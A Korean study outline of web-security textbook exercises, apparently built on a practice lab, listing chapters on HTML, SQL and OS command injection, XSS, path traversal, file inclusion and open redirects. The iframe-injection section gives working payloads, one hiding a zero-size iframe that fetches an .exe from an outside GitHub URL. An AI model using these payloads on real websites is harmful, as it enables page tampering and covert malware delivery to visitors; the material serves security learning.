# 대표 예제 복습: 웹 보안

##  제2장 HTML Injection
+ iFrame Injection ········· Page 100
iframe 인젝션 코드들
```
# 104p
robots.txt height="250" width="250"></iframe><iframe frameborder="0" src=htmli_get.php height="500" width="700"></iframe>

# 105p
robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src=htmli_get.php height="500" width="700"></iframe>

# 106p
robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src=htmli_get.php height="500" width="700"></iframe><iframe>

# 107p
robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src=htmli_get.php height="500" width="700">

# 108p
robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src= htmli_get.php height="0" width="0">

# 109p
robots.txt" height="250" width="250"></iframe><iframe frameborder="0" src= https://github.com/ncs10322/security/raw/main/MsgBox.exe height="0" width="0">
```
+ OS Command Injection ········· Page 119

##  제6장 SQL Injection
+ SQL Injection (GET/Search) ········· Page 216
+ SQL Injection (Login Form/Hero) ········· Page 254

##  제8장 XSS Injection
+ XSS(Cross Site Scripting) ········· Page 366
+ XSS - Reflected (JSON) ········· Page 384
+ XSS - Reflected (AJAX/JSON) ········· Page 388
+ XSS - Reflected (Referer) ········· Page 428


##  제11장 Path Traversal
+ Directory Traversal - Directories ········· Page 490
+ Directory Traversal - Files ········· Page 495

##  제14장 Remote & Local File Inclusion
+ Local File Inclusion ········· Page 534
+ Remote File Inclusion ········· Page 538

##  제17장 Unvalidated Redirects & Forwards
+ Unvalidated Redirects & Forwards (1) ········· Page 564
+ Unvalidated Redirects & Forwards (2) ········· Page 573
